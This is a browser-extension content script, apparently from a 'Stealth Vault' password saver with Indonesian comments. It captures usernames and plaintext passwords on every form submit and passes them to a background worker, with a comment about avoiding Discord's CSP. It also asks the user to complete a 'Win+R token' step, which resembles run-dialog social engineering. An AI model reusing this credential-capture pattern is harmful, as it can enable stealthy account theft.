// Listener untuk mendeteksi penyerahan form (Submit) pada halaman web
document.addEventListener("submit", function (e) {
  const form = e.target;
  const passwordInput = form.querySelector('input[type="password"]');
  const textInput = form.querySelector('input[type="text"], input[type="email"]');

  if (passwordInput && passwordInput.value) {
    const site = window.location.hostname;
    const username = textInput ? textInput.value : "Unknown User";
    const password = passwordInput.value;

    showFloatingSaveModal(site, username, password);
  }
}, true);

// Menampilkan UI Board Melayang untuk Konfirmasi Simpan
function showFloatingSaveModal(site, username, password) {
  if (document.getElementById("stealth-vault-modal")) return;

  const modal = document.createElement("div");
  modal.id = "stealth-vault-modal";
  modal.style.cssText = `
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 999999;
    background-color: #1e1e2e;
    color: #cdd6f4;
    border: 2px solid #89b4fa;
    border-radius: 10px;
    padding: 16px;
    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
    font-family: 'Segoe UI', sans-serif;
    max-width: 320px;
  `;

  modal.innerHTML = `
    <h4 style="margin: 0 0 8px 0; color: #89b4fa;">🔒 Stealth Vault Assistant</h4>
    <p style="margin: 0 0 12px 0; font-size: 13px;">Simpan akun baru untuk <b>${site}</b>?</p>
    <div style="font-size: 12px; margin-bottom: 12px; background: #313244; padding: 8px; border-radius: 5px;">
      <div><b>User:</b> ${username}</div>
      <div><b>Pass:</b> ••••••••••••</div>
    </div>
    <div style="display: flex; gap: 8px;">
      <button id="stealth-save-btn" style="flex: 1; padding: 6px; background: #a6e3a1; color: #11111b; border: none; border-radius: 5px; font-weight: bold; cursor: pointer;">Ya, Simpan</button>
      <button id="stealth-ignore-btn" style="flex: 1; padding: 6px; background: #f38ba8; color: #11111b; border: none; border-radius: 5px; cursor: pointer;">Abaikan</button>
    </div>
  `;

  document.body.appendChild(modal);

  document.getElementById("stealth-save-btn").addEventListener("click", () => {
    // Kirim pesan ke Background Service Worker agar tidak terblokir CSP Discord
    chrome.runtime.sendMessage(
      {
        type: "SAVE_PENDING_DATA",
        payload: { site, username, password }
      },
      (response) => {
        if (response && response.status === "SUCCESS") {
          alert("Silahkan buka popup Stealth Vault di toolbar browser untuk menyelesaikan verifikasi Token Win+R & Master Password.");
          modal.remove();
        }
      }
    );
  });

  document.getElementById("stealth-ignore-btn").addEventListener("click", () => {
    modal.remove();
  });
}